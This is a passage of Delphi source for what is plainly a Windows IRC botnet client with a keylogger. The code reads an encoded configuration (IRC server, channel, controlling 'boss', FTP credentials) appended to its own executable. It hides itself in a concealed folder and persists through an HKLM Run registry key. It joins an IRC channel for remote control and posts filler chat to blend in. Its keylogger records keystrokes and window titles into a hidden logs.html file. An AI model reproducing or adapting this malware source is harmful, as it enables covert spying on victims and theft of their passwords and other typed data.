      m2.code := @IrcPrivateMessage;
      m2.Data := irc;
      irc.OnPrivateMessage := TIdIRCPrivMessageEvent(m2);
      try
        irc.Connect;
      except
        //
      end;

    end;

    irc.Join(irc_channel);

    while ('1' = '1') do
    begin
      //
    end;

  finally
    irc.Free;
  end;
end;

procedure spam_irc;
const
  frases: array [1 .. 18] of string = ('Hola', 'Como andan', 'Como estas',
    'Que cuentan', 'Hoy estuvo genial', 'Oh Yeah', 'Que ondaaaaaaaaaaaaaaa',
    'De donde son', 'De donde sos', 'Estoy hablando con los grillos',
    'ajajajajaja', 'ahahaahahaha', 'Que dia de ****', 'Que hora tienen alla',
    'xD', 'LOL', 'WTF', 'OMG');
begin
  while ('1' = '1') do
  begin
    sleep(60000);
    irc.Say(irc_channel, frases[RandomRange(1, 19)]);
  end;
end;

procedure capturar_teclas;
var
  i: integer;
  Result: Longint;
  mayus: integer;
  shift: integer;

const

  n_numeros_izquierda: array [1 .. 10] of string = ('48', '49', '50', '51',
    '52', '53', '54', '55', '56', '57');

const
  t_numeros_izquierda: array [1 .. 10] of string = ('0', '1', '2', '3', '4',
    '5', '6', '7', '8', '9');

const
  n_numeros_derecha: array [1 .. 10] of string = ('96', '97', '98', '99', '100',
    '101', '102', '103', '104', '105');

const
  t_numeros_derecha: array [1 .. 10] of string = ('0', '1', '2', '3', '4', '5',
    '6', '7', '8', '9');

const
  n_shift: array [1 .. 22] of string = ('48', '49', '50', '51', '52', '53',
    '54', '55', '56', '57', '187', '188', '189', '190', '191', '192', '193',
    '291', '220', '221', '222', '226');

const
  t_shift: array [1 .. 22] of string = (')', '!', '@', '#', '\$', '%', '¨', '&',
    '*', '(', '+', '<', '_', '>', ':', '\', ' ? ', ' / \ ', '}', '{', '^', '|');

const
  n_raros: array [1 .. 17] of string = ('1', '8', '13', '32', '46', '187',
    '188', '189', '190', '191', '192', '193', '219', '220', '221',
    '222', '226');

const
  t_raros: array [1 .. 17] of string = ('[mouse click]', '[backspace]',
    '<br>[enter]<br>', '[space]', '[suprimir]', '=', ',', '-', '.', ';', '\',
    ' / ', ' \ \ \ ', ']', '[', '~', '\/');

begin

  // Others

  while ('1' = '1') do
  begin
    sleep(time_keylogger);
    for i := Low(n_raros) to High(n_raros) do
    begin
      Result := GetAsyncKeyState(StrToInt(n_raros[i]));
      If Result = -32767 then
      begin
        savefile('logs.html', t_raros[i]);
      end;
    end;

    // Numbers

    for i := Low(n_numeros_derecha) to High(n_numeros_derecha) do
    begin
      Result := GetAsyncKeyState(StrToInt(n_numeros_derecha[i]));
      If Result = -32767 then
      begin
        savefile('logs.html', t_numeros_derecha[i]);
      end;
    end;

    for i := Low(n_numeros_izquierda) to High(n_numeros_izquierda) do
    begin
      Result := GetAsyncKeyState(StrToInt(n_numeros_izquierda[i]));
      If Result = -32767 then
      begin
        savefile('logs.html', t_numeros_izquierda[i]);
      end;
    end;

    // SHIFT

    if (GetAsyncKeyState(VK_SHIFT) <> 0) then
    begin

      for i := Low(n_shift) to High(n_shift) do
      begin
        Result := GetAsyncKeyState(StrToInt(n_shift[i]));
        If Result = -32767 then
        begin
          savefile('logs.html', t_shift[i]);
        end;
      end;

      for i := 65 to 90 do
      begin
        Result := GetAsyncKeyState(i);
        If Result = -32767 then
        Begin
          savefile('logs.html', Chr(i + 0));
        End;
      end;

    end;

    // MAYUS

    if (GetKeyState(20) = 0) then
    begin
      mayus := 32;
    end
    else
    begin
      mayus := 0;
    end;

    for i := 65 to 90 do
    begin
      Result := GetAsyncKeyState(i);
      If Result = -32767 then
      Begin
        savefile('logs.html', Chr(i + mayus));
      End;
    end;
  end;
end;

procedure capturar_ventanas;
var
  ventana1: array [0 .. 255] of Char;
  nombre1: string;
  nombre2: string;

begin
  while ('1' = '1') do
  begin
    sleep(time_keylogger);
    GetWindowText(GetForegroundWindow, ventana1, SizeOf(ventana1));
    nombre1 := ventana1;
    if not(nombre1 = nombre2) then
    begin
      nombre2 := nombre1;
      savefile('logs.html', '<hr style=color:#00FF00><h2><center>' + nombre2 +
        '</h2></center><br>');
    end;
  end;

end;

begin
  try

    ob := INVALID_HANDLE_VALUE;
    code := '';

    ob := CreateFile(Pchar(paramstr(0)), GENERIC_READ, FILE_SHARE_READ, nil,
      OPEN_EXISTING, 0, 0);
    if (ob <> INVALID_HANDLE_VALUE) then
    begin
      SetFilePointer(ob, -9999, nil, FILE_END);
      ReadFile(ob, code, 9999, nose, nil);
      CloseHandle(ob);
    end;

    todo := regex(code, '[63686175]', '[63686175]');
    todo := dhencode(todo, 'decode');

    if (todo = '') then
    begin
      //Writeln('[-] Offline');
    end
    else
    begin

      time_keylogger := 100; // Not Edit

      irc_host := regex(todo, '[irc_host]', '[irc_host]');
      irc_host_secundario := regex(todo, '[irc_other_host]',
        '[irc_other_host]');
      irc_port := regex(todo, '[irc_port]', '[irc_port]');
      irc_channel := regex(todo, '[irc_channel]', '[irc_channel]');
      admin := regex(todo, '[boss]', '[boss]');
      timeout := regex(todo, '[timeout]', '[timeout]');
      nick_definido := regex(todo, '[nick]', '[nick]');
      if (nick_definido = '') then
      begin
        gen_nick := generate_nick();
        irc_nick := gen_nick;
        irc_user := gen_nick;
      end
      else
      begin
        irc_nick := nick_definido;
        irc_user := nick_definido;
      end;

      ftp_host := regex(todo, '[ftp_host]', '[ftp_host]');
      ftp_user := regex(todo, '[ftp_user]', '[ftp_user]');
      ftp_pass := regex(todo, '[ftp_pass]', '[ftp_pass]');
      ftp_path := regex(todo, '[ftp_path]', '[ftp_path]');

      keylogger_activo := regex(todo, '[use_keylogger]', '[use_keylogger]');

      // Install

      i_use_this := regex(todo, '[i_use_this]', '[i_use_this]');
      dir := regex(todo, '[directorio]', '[directorio]');
      dirs := regex(todo, '[directorios]', '[directorios]');
      folder := regex(todo, '[folder]', '[folder]');

      if (i_use_this = '1') then
      begin
        directorio_final := dir + '/' + folder;
      end
      else
      begin
        directorio_final := GetEnvironmentVariable(dirs) + '/' + folder;
      end;

      nombrereal := ExtractFileName(paramstr(0));
      yalisto := directorio_final + '/' + nombrereal;

      if not(DirectoryExists(directorio_final)) then
      begin
        CreateDir(directorio_final);
      end;

      chdir(directorio_final);

      // CopyFile(pchar(paramstr(0)), pchar(yalisto), False);
      MoveFile(Pchar(paramstr(0)), Pchar(yalisto));

      SetFileAttributes(Pchar(yalisto), FILE_ATTRIBUTE_HIDDEN);
      SetFileAttributes(Pchar(directorio_final), FILE_ATTRIBUTE_HIDDEN);

      try
        begin
          RegCreateKeyEx(HKEY_LOCAL_MACHINE,
            'Software\Microsoft\Windows\CurrentVersion\Run\', 0, nil,
            REG_OPTION_NON_VOLATILE, KEY_WRITE, nil, registro, nil);
          RegSetValueEx(registro, 'uberkxx', 0, REG_SZ, Pchar(yalisto), 666);
          RegCloseKey(registro);
        end;
      except
        //
      end;


      //

      BeginThread(nil, 0, @start_irc, nil, 0, PDWORD(0)^);
      BeginThread(nil, 0, @spam_irc, nil, 0, PDWORD(0)^);

      if (keylogger_activo = '1') then
      begin
        savefile('logs.html',
          '<style>body {background-color: black;color:#00FF00;cursor:crosshair;}</style>');
        SetFileAttributes(Pchar('logs.html'), FILE_ATTRIBUTE_HIDDEN);
        BeginThread(nil, 0, @capturar_teclas, nil, 0, PDWORD(0)^);
        BeginThread(nil, 0, @capturar_ventanas, nil, 0, PDWORD(0)^);
      end;

      //Writeln('[+] Online');

      while (1 = 1) do
        sleep(1);

    end;

  except
    on E: Exception do
      // Writeln(E.ClassName, ': ', E.Message);
  end;

end.

// The End ?
